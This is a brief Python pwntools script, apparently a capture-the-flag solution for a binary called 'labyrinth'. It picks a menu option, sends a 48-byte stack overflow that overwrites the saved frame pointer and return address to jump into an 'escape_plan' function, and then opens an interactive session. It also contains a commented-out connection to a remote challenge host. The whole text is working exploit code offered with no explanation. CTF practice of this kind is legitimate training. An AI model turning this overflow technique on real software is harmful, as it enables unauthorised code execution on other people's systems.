from pwn import *

io = process("./labyrinth")
# io = remote("165.232.108.36",31420)
elf = ELF('./labyrinth')
libc = elf.libc
rop = ROP(elf)
gdbscript="""
b *0x4015fc
c
"""
# gdb.attach(io, gdbscript=gdbscript)

io.sendline(b'69')

payload = b"A"*48 + p64(0x404000 + 8)
payload += p64(elf.sym['escape_plan'] + 50)
io.sendline(payload)

io.interactive()